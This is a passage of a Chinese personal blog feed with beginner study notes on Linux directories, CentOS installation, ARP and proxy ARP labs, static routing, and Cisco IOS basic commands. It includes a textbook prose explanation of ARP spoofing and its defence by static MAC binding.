title="（2）普通目录"></a>（2）普通目录</h3><ul><li>usr：存放应用程序和用户相关的数据文件目录；</li><li>boot：引导目录；</li><li>dev：设备目录，管理当前的设备的；</li><li>etc：系统管理所需要的配置文件；</li><li>home：家目录，普通用户的文件夹；</li><li>root：系统超级管理员的主目录；</li><li>opt：可选目录，给第三方软件预留的目录，约定熟成的目录；</li><li>media：媒体目录，可移动媒体设备的挂载点；</li><li>mnt：挂载目录，任何的移动化存储目录的另一个挂载点；</li><li>proc：process缩写，存放的是现有的一些硬件和进程的信息；</li><li>run：运行目录，当前系统运行起来的所有实时信息，临时的文件系统，重启后清零；</li><li>srv：service的缩写，存放的跟系统服务相关的文件；</li><li>sys：存放的是系统硬件信息的相关文件；</li><li>tmp：临时目录；</li><li>var：可变目录，存放经常会变化，修改的东西；如日志文件；</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 桌面及终端基础操作</title>
      <link href="/blog/e34058e3.html/"/>
      <url>/blog/e34058e3.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：桌面"><a href="#一：桌面" class="headerlink" title="一：桌面"></a>一：桌面</h1><ul><li>新建文件夹</li><li>新建文本</li><li>修改桌面</li><li>打开终端</li><li>快捷键设置：super 相当于 windows键</li><li>修改屏幕分辨率</li></ul><h1 id="二：终端"><a href="#二：终端" class="headerlink" title="二：终端"></a>二：终端</h1><ul><li>修改终端打开字体</li><li>修改终端配色方案</li></ul><h1 id="三：常用快捷键"><a href="#三：常用快捷键" class="headerlink" title="三：常用快捷键"></a>三：常用快捷键</h1><ul><li>当前窗口全屏：Alt + F10</li><li>切换桌面系统：Ctrl + Alt + F1</li><li>切换命令行系统：Ctrl + Alt + F2<ul><li>F2~F6 均为命令行模式，多用户登录；</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 安装</title>
      <link href="/blog/6f1dea9.html/"/>
      <url>/blog/6f1dea9.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：下载"><a href="#一：下载" class="headerlink" title="一：下载"></a>一：下载</h1><h2 id="1-1-Linux-系统镜像下载"><a href="#1-1-Linux-系统镜像下载" class="headerlink" title="1.1 Linux 系统镜像下载"></a>1.1 Linux 系统镜像下载</h2><p>官方地址：<a href="https://www.centos.org/">The CentOS Project</a></p><h2 id="1-2-VMware-虚拟化平台下载"><a href="#1-2-VMware-虚拟化平台下载" class="headerlink" title="1.2 VMware 虚拟化平台下载"></a>1.2 VMware 虚拟化平台下载</h2><p>官方地址：<a href="https://www.vmware.com/">VMware - Delivering a Digital Foundation For Businesses</a></p><p>VMware WorkStation Pro：商用付费版本</p><p>VMware WorkStation Player：个人免费版本</p><h1 id="二：创建虚拟机"><a href="#二：创建虚拟机" class="headerlink" title="二：创建虚拟机"></a>二：创建虚拟机</h1><h2 id="2-1-CPU配置"><a href="#2-1-CPU配置" class="headerlink" title="2.1 CPU配置"></a>2.1 CPU配置</h2><ul><li>处理器数量：对应CPU插槽数量；</li><li>每个处理器的内核数量：一个CPU插槽上的CPU有几个处理核心；</li></ul><p>参考主机 任务管理器 参数设置：</p><p><img src="/blog/6f1dea9.html/image-20221203120359609.png"></p><ul><li>逻辑处理器：每个CPU内核通过超线程技术，可以模拟出2个逻辑处理器。</li></ul><h2 id="2-2-网络连接方式"><a href="#2-2-网络连接方式" class="headerlink" title="2.2 网络连接方式"></a>2.2 网络连接方式</h2><ul><li>桥接：将主机作为一个桥，使得创建的虚拟机与主机处于同等地位，共同连接同一个路由器下的网络。</li><li>NAT：将主机看做一个虚拟机的路由器，虚拟机借助主机与外部网络连通。</li></ul><h1 id="三：安装CentOS系统"><a href="#三：安装CentOS系统" class="headerlink" title="三：安装CentOS系统"></a>三：安装CentOS系统</h1><h2 id="3-1-启用虚拟化"><a href="#3-1-启用虚拟化" class="headerlink" title="3.1 启用虚拟化"></a>3.1 启用虚拟化</h2><p>在BIOS中开启虚拟化；</p><h2 id="3-2-挂载镜像"><a href="#3-2-挂载镜像" class="headerlink" title="3.2 挂载镜像"></a>3.2 挂载镜像</h2><p><img src="/blog/6f1dea9.html/image-20221203130557001.png"></p><h2 id="3-3-磁盘分区"><a href="#3-3-磁盘分区" class="headerlink" title="3.3 磁盘分区"></a>3.3 磁盘分区</h2><ul><li>创建引导分区：&#x2F;boot，必须位于该目录；1G即可；文件系统xfp；</li></ul><p>创建交换分区：swap，没有“&#x2F;”，单独设置硬盘的一块区域，作为一个扩展的内存。</p><ul><li>当内存用满的时候，我们此时还要开启另一个应用，内存会把当前未在使用的应用放入交换分区，空闲出空间，让我们启动新的应用，而不至于程序卡死。（虚拟内存）</li><li>实际内存的1倍或者2倍</li><li>文件系统：swap</li></ul><p>剩余空间分区：全部挂载至 “&#x2F;” 根目录下；</p><img src="/blog/6f1dea9.html/image-20221203131342655.png"><h2 id="3-4-网络及主机名"><a href="#3-4-网络及主机名" class="headerlink" title="3.4 网络及主机名"></a>3.4 网络及主机名</h2><p>修改主机名称；</p><p>开启以太网；</p><img src="/blog/6f1dea9.html/image-20221203131443676.png"><h2 id="3-5-创建用户"><a href="#3-5-创建用户" class="headerlink" title="3.5 创建用户"></a>3.5 创建用户</h2><img src="/blog/6f1dea9.html/image-20221203131508491.png"><img src="/blog/6f1dea9.html/image-20221203131642696.png"><h1 id="四：开机测试"><a href="#四：开机测试" class="headerlink" title="四：开机测试"></a>四：开机测试</h1><h2 id="4-1-桌面"><a href="#4-1-桌面" class="headerlink" title="4.1 桌面"></a>4.1 桌面</h2><img src="/blog/6f1dea9.html/image-20221203133153586.png" style="zoom:67%;"><h2 id="4-2-网络"><a href="#4-2-网络" class="headerlink" title="4.2 网络"></a>4.2 网络</h2><img src="/blog/6f1dea9.html/image-20221203133337906.png" style="zoom:67%;"><p>至此，Linux 系统安装就完成了，网络连接也可以正常使用！</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 概述</title>
      <link href="/blog/d7d0f9b9.html/"/>
      <url>/blog/d7d0f9b9.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Linux-是什么？"><a href="#一：Linux-是什么？" class="headerlink" title="一：Linux 是什么？"></a>一：Linux 是什么？</h1><p>Linux 是一个操作系统（OS）</p><img src="/blog/d7d0f9b9.html/image-20221202010250119.png" style="zoom:50%;"><h1 id="二：Linux-的诞生"><a href="#二：Linux-的诞生" class="headerlink" title="二：Linux 的诞生"></a>二：Linux 的诞生</h1><img src="/blog/d7d0f9b9.html/image-20221202010332476.png" style="zoom: 67%;"><h1 id="三：Linux-与-Unix-的渊源"><a href="#三：Linux-与-Unix-的渊源" class="headerlink" title="三：Linux 与 Unix 的渊源"></a>三：Linux 与 Unix 的渊源</h1><p><img src="/blog/d7d0f9b9.html/image-20221202010434500.png"></p><ul><li>Dennis Ritchie：开发了C语言；</li><li>Linus Torvalds：开发了 Git 工具；</li><li>FreeBSD：开源协议限制较少，不要求需要全部公开源码，便于商业使用，Mac OS 系统也基于其开发而成。</li></ul><h1 id="四：GUN-x2F-Linux"><a href="#四：GUN-x2F-Linux" class="headerlink" title="四：GUN&#x2F;Linux"></a>四：GUN&#x2F;Linux</h1><img src="/blog/d7d0f9b9.html/image-20221202011012214.png" style="zoom:67%;"><ul><li>Richard Stallman：黑客大神，自由软件开拓者，GNU协议发起者与倡导者；GUN协议要求，基于其开发的应用程序都要公布源代码，用户友好性。</li><li>Linus Torvalds 写的是 Linux 的内核，内核搭配上外围应用（GUN提供）组成一个完整的操作系统。</li></ul><h1 id="五：Linux-发行版本"><a href="#五：Linux-发行版本" class="headerlink" title="五：Linux 发行版本"></a>五：Linux 发行版本</h1><img src="/blog/d7d0f9b9.html/image-20221202011436019.png" style="zoom:80%;"><h1 id="六：Linux-VS-Windows"><a href="#六：Linux-VS-Windows" class="headerlink" title="六：Linux VS Windows"></a>六：Linux VS Windows</h1><p><img src="/blog/d7d0f9b9.html/image-20221202011609137.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP 协议</title>
      <link href="/blog/481361ad.html/"/>
      <url>/blog/481361ad.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：概念"><a href="#一：概念" class="headerlink" title="一：概念"></a>一：概念</h1><ul><li>ARP：address resolution protocol，地址解析协议</li><li>作用：将已知的IP地址解析为MAC地址</li></ul><h1 id="二：实验"><a href="#二：实验" class="headerlink" title="二：实验"></a>二：实验</h1><img src="/blog/481361ad.html/image-20221201133858284.png" style="zoom:50%;"><h2 id="2-1-对首次ping进行抓包"><a href="#2-1-对首次ping进行抓包" class="headerlink" title="2.1 对首次ping进行抓包"></a>2.1 对首次ping进行抓包</h2><h3 id="（1）路由器R1"><a href="#（1）路由器R1" class="headerlink" title="（1）路由器R1"></a>（1）路由器R1</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show ip interface brief </span></span><br><span class="line">Interface                  IP-Address      OK? Method Status                Protocol</span><br><span class="line">GigabitEthernet0/0         192.168.1.1     YES manual up                    up      </span><br><span class="line">GigabitEthernet0/1         unassigned      YES <span class="built_in">unset</span>  administratively down down    </span><br><span class="line">GigabitEthernet0/2         unassigned      YES <span class="built_in">unset</span>  administratively down down    </span><br><span class="line">GigabitEthernet0/3         unassigned      YES <span class="built_in">unset</span>  administratively down down </span><br><span class="line"></span><br><span class="line">Router<span class="comment">#ping 192.168.1.3</span></span><br><span class="line">Type escape sequence to abort.</span><br><span class="line">Sending 5, 100-byte ICMP Echos to 192.168.1.3, <span class="built_in">timeout</span> is 2 seconds:</span><br><span class="line">.!!!!</span><br><span class="line">Success rate is 80 percent (4/5), round-trip min/avg/max = 2/2/4 ms</span><br></pre></td></tr></table></figure><h3 id="（2）路由器R2"><a href="#（2）路由器R2" class="headerlink" title="（2）路由器R2"></a>（2）路由器R2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show ip interface brief </span></span><br><span class="line">Interface                  IP-Address      OK? Method Status                Protocol</span><br><span class="line">GigabitEthernet0/0         192.168.1.3     YES manual up                    up      </span><br><span class="line">GigabitEthernet0/1         unassigned      YES <span class="built_in">unset</span>  administratively down down    </span><br><span class="line">GigabitEthernet0/2         unassigned      YES <span class="built_in">unset</span>  administratively down down    </span><br><span class="line">GigabitEthernet0/3         unassigned      YES <span class="built_in">unset</span>  administratively down down</span><br></pre></td></tr></table></figure><h3 id="（3）使用-wireshark-进行抓包"><a href="#（3）使用-wireshark-进行抓包" class="headerlink" title="（3）使用 wireshark 进行抓包"></a>（3）使用 wireshark 进行抓包</h3><p><img src="/blog/481361ad.html/image-20221201133530514.png"></p><p>由抓包结果进行分析，首次的Ping发送了一个ARP广播；192.168.1.3 接收到后保存了发送方的Mac地址，并做出了单播响应，告知了对方自己的Mac地址。因此，此后的5次PING命令，分别抓到发送和响应8个ICMP包。</p><h2 id="2-2-查看-ARP"><a href="#2-2-查看-ARP" class="headerlink" title="2.2 查看 ARP"></a>2.2 查看 ARP</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show arp</span></span><br><span class="line">Protocol  Address          Age (min)  Hardware Addr   Type   Interface</span><br><span class="line">Internet  192.168.1.1             -   5061.e800.1400  ARPA   GigabitEthernet0/0</span><br><span class="line">Internet  192.168.1.2            27   50ea.cd00.1500  ARPA   GigabitEthernet0/0</span><br><span class="line">Internet  192.168.1.3            12   50ea.cd00.1500  ARPA   GigabitEthernet0/0</span><br></pre></td></tr></table></figure><p>以太网的头部，每经过一个路由器都会从新编写一个新的头部，修改源MAC和目的MAC。</p><h1 id="三：代理-ARP"><a href="#三：代理-ARP" class="headerlink" title="三：代理 ARP"></a>三：代理 ARP</h1><h2 id="3-1-概念"><a href="#3-1-概念" class="headerlink" title="3.1 概念"></a>3.1 概念</h2><p>代理ARP（proxy arp）：通常就是一个主机（路由器），作为指定的设备（路由器代替该设备）对另一台设备的APR请求做出响应。</p><h2 id="3-2-实例"><a href="#3-2-实例" class="headerlink" title="3.2 实例"></a>3.2 实例</h2><img src="/blog/481361ad.html/image-20221201153651270.png" style="zoom:50%;"><h3 id="（1）R1-路由"><a href="#（1）R1-路由" class="headerlink" title="（1）R1 路由"></a>（1）R1 路由</h3><p>通过出接口方式，将数据包通过Gi0&#x2F;0接口发送出去；路由表新增一条静态路由；</p><p>通过 wireshark 抓包情况，发现若不配置出接口，数据将因无法定位到目标MAC而在路由器内部发不出去。</p><p>当配置出接口后，首次PING进行广播，获取到目标设备的MAC地址，wireshark 抓取到 8次通信数据包。</p><p>由此，R1和R2路由互通。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># R1: 通过出接口方式配置路由</span></span><br><span class="line">ip route 192.168.1.0 255.255.255.0 Gi0/0 </span><br><span class="line"></span><br><span class="line">Router<span class="comment">#show ip route</span></span><br><span class="line">Codes: L - <span class="built_in">local</span>, C - connected, S - static, R - RIP, M - mobile, B - BGP</span><br><span class="line">       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area </span><br><span class="line">       N1 - OSPF NSSA external <span class="built_in">type</span> 1, N2 - OSPF NSSA external <span class="built_in">type</span> 2</span><br><span class="line">       E1 - OSPF external <span class="built_in">type</span> 1, E2 - OSPF external <span class="built_in">type</span> 2</span><br><span class="line">       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2</span><br><span class="line">       ia - IS-IS inter area, * - candidate default, U - per-user static route</span><br><span class="line">       o - ODR, P - periodic downloaded static route, H - NHRP, l - LISP</span><br><span class="line">       a - application route</span><br><span class="line">       + - replicated route, % - next hop override, p - overrides from PfR</span><br><span class="line"></span><br><span class="line">Gateway of last resort is not <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">      192.168.0.0/24 is variably subnetted, 2 subnets, 2 masks</span><br><span class="line">C        192.168.0.0/24 is directly connected, GigabitEthernet0/0</span><br><span class="line">L        192.168.0.1/32 is directly connected, GigabitEthernet0/0</span><br><span class="line">S     192.168.1.0/24 is directly connected, GigabitEthernet0/0</span><br></pre></td></tr></table></figure><h3 id="（2）R2-路由"><a href="#（2）R2-路由" class="headerlink" title="（2）R2 路由"></a>（2）R2 路由</h3><p>仅仅配置了2个接口的IP地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show ip route</span></span><br><span class="line">Codes: L - <span class="built_in">local</span>, C - connected, S - static, R - RIP, M - mobile, B - BGP</span><br><span class="line">       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area </span><br><span class="line">       N1 - OSPF NSSA external <span class="built_in">type</span> 1, N2 - OSPF NSSA external <span class="built_in">type</span> 2</span><br><span class="line">       E1 - OSPF external <span class="built_in">type</span> 1, E2 - OSPF external <span class="built_in">type</span> 2</span><br><span class="line">       i - IS-IS, su - IS-IS summary, L1 - IS-IS level-1, L2 - IS-IS level-2</span><br><span class="line">       ia - IS-IS inter area, * - candidate default, U - per-user static route</span><br><span class="line">       o - ODR, P - periodic downloaded static route, H - NHRP, l - LISP</span><br><span class="line">       a - application route</span><br><span class="line">       + - replicated route, % - next hop override, p - overrides from PfR</span><br><span class="line"></span><br><span class="line">Gateway of last resort is not <span class="built_in">set</span></span><br><span class="line"></span><br><span class="line">      192.168.0.0/24 is variably subnetted, 2 subnets, 2 masks</span><br><span class="line">C        192.168.0.0/24 is directly connected, GigabitEthernet0/0</span><br><span class="line">L        192.168.0.2/32 is directly connected, GigabitEthernet0/0</span><br><span class="line">      192.168.1.0/24 is variably subnetted, 2 subnets, 2 masks</span><br><span class="line">C        192.168.1.0/24 is directly connected, GigabitEthernet0/1</span><br><span class="line">L        192.168.1.2/32 is directly connected, GigabitEthernet0/1</span><br></pre></td></tr></table></figure><p>配置R2路由，关于1网段的出接口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)<span class="comment">#ip route 192.168.1.0 255.255.255.0 Gi0/1</span></span><br></pre></td></tr></table></figure><p>此时，若要从R1向R3发送数据包，通过 wireshark 抓包分析，数据包成功发送出去，却没有响应，所以此时，我们应该配置R3路由通往0网段的出接口。</p><h3 id="（3）R3-路由"><a href="#（3）R3-路由" class="headerlink" title="（3）R3 路由"></a>（3）R3 路由</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)<span class="comment">#ip route 192.168.0.0 255.255.255.0 Gi0/0</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Router&gt;ping 192.168.0.1</span><br><span class="line">Type escape sequence to abort.</span><br><span class="line">Sending 5, 100-byte ICMP Echos to 192.168.0.1, <span class="built_in">timeout</span> is 2 seconds:</span><br><span class="line">!!!!!</span><br><span class="line">Success rate is 100 percent (5/5), round-trip min/avg/max = 3/4/7 ms</span><br></pre></td></tr></table></figure><p>此时可以观察到R1路由与R3路由实现了互通。</p><h2 id="3-3-ARP-变化"><a href="#3-3-ARP-变化" class="headerlink" title="3.3 ARP 变化"></a>3.3 ARP 变化</h2><p>当我们R1与R3未进行通信时，此时R3的ARP表的情况是这样的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show ip arp</span></span><br><span class="line">Protocol  Address          Age (min)  Hardware Addr   Type   Interface</span><br><span class="line">Internet  192.168.1.2            62   506e.b500.1701  ARPA   GigabitEthernet0/0</span><br><span class="line">Internet  192.168.1.3             -   502e.cd00.1800  ARPA   GigabitEthernet0/0</span><br></pre></td></tr></table></figure><p>当完成上述实例通信时，两者互通，此时查看R3的ARP表如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Router<span class="comment">#show ip arp</span></span><br><span class="line">Protocol  Address          Age (min)  Hardware Addr   Type   Interface</span><br><span class="line">Internet  192.168.0.1             1   506e.b500.1701  ARPA   GigabitEthernet0/0</span><br><span class="line">Internet  192.168.1.2            65   506e.b500.1701  ARPA   GigabitEthernet0/0</span><br><span class="line">Internet  192.168.1.3             -   502e.cd00.1800  ARPA   GigabitEthernet0/0</span><br></pre></td></tr></table></figure><p>由上述两表观察可知，R1路由的地址被存储在了R3的ARP表中，且因为有存活时间，更值得注意的是此处用到了 APR代理，代理地址即为我们的R2路由。因此此处由于设计本身的缺陷，存在漏洞，故而当代理ARP进行广播请求时，我们可以冒充网关（被攻击机的下一跳地址），给被攻击机做出单播响应，这样被攻击机就会存储攻击机的MAC地址，下次发送数据就会发送给攻击机，被攻击方可以直观的感受到不能上网（地址冲突），或者网络请求超时等。</p><p><img src="/blog/481361ad.html/image-20221202090929264.png"></p><h1 id="四：总结"><a href="#四：总结" class="headerlink" title="四：总结"></a>四：总结</h1><ul><li>APR 后到优先，当下一跳存在2台路由器时，广播响应会被两台路由都响应，后者会将前者的响应覆盖，可能会导致我们的路由寻址不是最优路径；</li><li>只写出接口的静态路由会依赖代理ARP，若关闭代理ARP则不能实现通信； </li><li>代理ARP 会产生大量ARP映射列表，这些数据会占用内存；</li><li>最好的静态路由写法就是既有出接口，又有下一跳；</li><li>仅写下一跳会触发自身的递归查询；</li><li>ARP攻击：由于自身广播请求，所以请求的目的IP会被当前广播域内，所有的主机听到；若此时，黑客伪装自己的IP地址，就是我们请求的地址，再回访我们一次；即使我们之前请求到了真的服务器地址，但由于ARP本身后到优先的机制，黑客的地址会覆盖之前真正服务器的地址；我们的ARP映射列表中存储了黑客电脑的MAC，此时发送消息，我们就把数据全部发送到了黑客的电脑。</li><li>防止ARP攻击：人为手动绑定MAC地址，arp IP address MAC address arpa；ARP映射表中就有了对方的MAC，无法被后到优先覆盖，防止被ARP欺骗。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 思科CCNA网络基础入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态路由协议</title>
      <link href="/blog/d18d3c00.html/"/>
      <url>/blog/d18d3c00.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：概述"><a href="#一：概述" class="headerlink" title="一：概述"></a>一：概述</h1><ul><li>一个小型到中型的网络适合静态路由，而且没有或只有较小的扩充计划时。</li><li>静态路由需要手工输入、手工管理；管理开销对于动态路由来说是一个大大的负担。</li></ul><h1 id="二：优缺点"><a href="#二：优缺点" class="headerlink" title="二：优缺点"></a>二：优缺点</h1><ul><li>优点：<ul><li>对路由器CPU没有管理开销</li><li>在路由器间没有宽带占用</li><li>增加安全性</li></ul></li><li>缺点：<ul><li>必须真正的了解网络</li><li>对于新添加网络配置繁琐</li><li>对于大型网络工作量巨大</li></ul></li></ul><h1 id="三：静态路由配置"><a href="#三：静态路由配置" class="headerlink" title="三：静态路由配置"></a>三：静态路由配置</h1><ul><li>配置命令<ul><li>ip route newwork-address subnet-mask { ip-add | exit-interface } </li><li>ip route 192.168.1.0 255.255.255.0 192.168.12.2</li><li>ip route 192.168.1.0 255.255.255.0 serial 0</li></ul></li><li>查看路由表<ul><li>show ip route</li><li>do show ip route</li></ul></li></ul><h1 id="四：实验"><a href="#四：实验" class="headerlink" title="四：实验"></a>四：实验</h1><h2 id="4-1-实验目录"><a href="#4-1-实验目录" class="headerlink" title="4.1 实验目录"></a>4.1 实验目录</h2><p>练习对静态路由配置的使用；</p><h2 id="4-2-实验内容"><a href="#4-2-实验内容" class="headerlink" title="4.2 实验内容"></a>4.2 实验内容</h2><p>通过 PNETLab Box 新建3台路由器，分别为三台路由器配置 IP 地址，并将三台路由器接线依次连通。通过在路由器上配置静态路由，使得三个路由器之间信息可以达到互传的目的。</p><h2 id="4-3-实验过程"><a href="#4-3-实验过程" class="headerlink" title="4.3 实验过程"></a>4.3 实验过程</h2><ol><li><p>新建PNETLab Box实验室</p></li><li><p>新建3个路由器</p></li><li><p>配置基础设置</p><ul><li>工程三招</li></ul></li><li><p>为路由器配置IP地址</p><ul><li>enable</li><li>configure terminal</li><li>interface 接口类型 插槽&#x2F;接口编号</li><li>ip address ip地址 子网掩码</li><li>no shutdown</li><li>end</li><li>show ip interface brief</li></ul></li><li><p>配置静态路由</p><img src="/blog/d18d3c00.html/image-20221201115529110.png" style="zoom:50%;"></li></ol><ul><li>为中间路由配置2个IP地址</li><li>通过下一跳方式配置路由<ul><li>实现192.168.1.110 与 192.168.2.111 通信</li><li>ip route 192.168.2.0 255.255.255.0 192.168.1.111</li><li>该指令明通过明确下一跳地址，源路由通过递归查询出接口（与192.168.1.111可实现互通的出接口），将数据发送到目标路由器上。</li></ul></li><li>通过配置出接口方式<ul><li>ip route 192.168.2.0 255.255.255.0 Gi0&#x2F;0</li><li>该方法通过直接指定出接口，将数据包发送出去。</li></ul></li><li>通过配置出接口+IP地址方式<ul><li>ip route 192.168.2.0 255.255.255.0 Gi0&#x2F;0 192.168.1.111</li><li>更加详细的指出对方接收数据的ip地址，安全可靠。</li></ul></li></ul><h2 id="4-4-实验总结"><a href="#4-4-实验总结" class="headerlink" title="4.4 实验总结"></a>4.4 实验总结</h2><ol><li>一个路由器，可以通过配置IP来标识自身，以及所处网段。</li><li>两个路由器通过线路直接连接，即可互通。</li><li>三台路由器通过搭桥的方式实现互通，两端路由器分别都要与桥的对端出接口互通，即可完成三者互通。</li><li>路由通信的本质是：当发送一个数据包时，已知自身IP，通过路由表查询目标地址或下一跳地址，数据被推送出去；当数据被下一跳接受到时，该路由器检索自身的路由表，再次进行数据转发，直到目标地址接收到为止。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 思科CCNA网络基础入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cisco IOS 基础命令集汇总</title>
      <link href="/blog/a86956cb.html/"/>
      <url>/blog/a86956cb.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Cisco-IOS"><a href="#一：Cisco-IOS" class="headerlink" title="一：Cisco IOS"></a>一：Cisco IOS</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><ul><li>Cisco internetwork operating system（IOS）：为 Cisco 设备配备的系统软件。应用于路由器、局域网交换机、小型无线接入点、具有几十个接口的大型路由器等。</li></ul><h2 id="1-2-功能"><a href="#1-2-功能" class="headerlink" title="1.2 功能"></a>1.2 功能</h2><ul><li>Cisco IOS 可为设备提供以下网络服务<ul><li>基本的路由和交换功能</li><li>安全可靠地访问网络资源</li><li>网络可伸缩性</li></ul></li></ul><h2 id="1-3-访问方式"><a href="#1-3-访问方式" class="headerlink" title="1.3 访问方式"></a>1.3 访问方式</h2><ul><li>可以通过多种方法访问 CLI 环境，常见方式：<ul><li>控制台</li><li>Telnet 或者 SSH</li><li>辅助端口</li></ul></li></ul><img src="/blog/a86956cb.html/image-20221130114858440.png" style="zoom: 50%;"><h2 id="1-4-访问模式"><a href="#1-4-访问模式" class="headerlink" title="1.4 访问模式"></a>1.4 访问模式</h2><ul><li>用户执行模式 “&gt;”</li><li>特权执行模式 “#”</li><li>全局配置模式<ul><li>从全局配置模式可进入多种不同的配置模式。其中每种模式可用于配置 IOS 设备的特定部分或者特定功能。</li></ul></li><li>其他特定模式<ul><li>接口模式：用于配置一个网络接口（Fa0&#x2F;0、S0&#x2F;0&#x2F;0 等）</li><li>线路模式：用于配置一条线路（实际线路或者虚拟线路），如控制台、AUX、VTY等</li><li>路由配置模式：用于配置一个路由选择协议进程的相关参数</li></ul></li></ul><h2 id="1-5-模式切换"><a href="#1-5-模式切换" class="headerlink" title="1.5 模式切换"></a>1.5 模式切换</h2><ul><li>enable：用户执行模式进入特权模式</li><li>configure terminal：特权模式进入全局配置模式</li><li>exit：返回上一级模式</li><li>end：直接返回特权模式</li></ul><h2 id="1-6-基础操作"><a href="#1-6-基础操作" class="headerlink" title="1.6 基础操作"></a>1.6 基础操作</h2><ul><li>?：使用 ? 可以匹配查看命令库</li><li>设置IP：ip address IP地址 子网掩码</li><li>no：使用 no shutdown，退出保持状态开启。</li><li>show running-config：查看配置信息</li><li>show ip interface brief：查看 ip 简短信息</li><li>hostname 名称：设置主机名称（全局模式下）</li><li>enable password 密码：设置主机密码</li><li>no enable password：关闭密码验证</li><li>enable secret 密码：采用加密方式设置密码</li></ul><h2 id="1-7-语法检查"><a href="#1-7-语法检查" class="headerlink" title="1.7 语法检查"></a>1.7 语法检查</h2><ul><li>incomplete command：命令不完整</li><li>invalid input detected at ‘^’ marker：箭头所指字符无法识别 </li><li>ambiguous comm：未知输入</li></ul><h2 id="1-8-基本命令结构"><a href="#1-8-基本命令结构" class="headerlink" title="1.8 基本命令结构"></a>1.8 基本命令结构</h2><ul><li>每个 IOS 命令都具有特定的格式或者语法，并在相应的提示符下执行</li><li>常规命令语法为命令后接相应的关键字和参数<ul><li>Router&gt; ping 192.168.1.2</li></ul></li><li>某些命令包括一个关键字和参数子集，此子集可提供额外功能</li></ul><h2 id="1-9-快捷键"><a href="#1-9-快捷键" class="headerlink" title="1.9 快捷键"></a>1.9 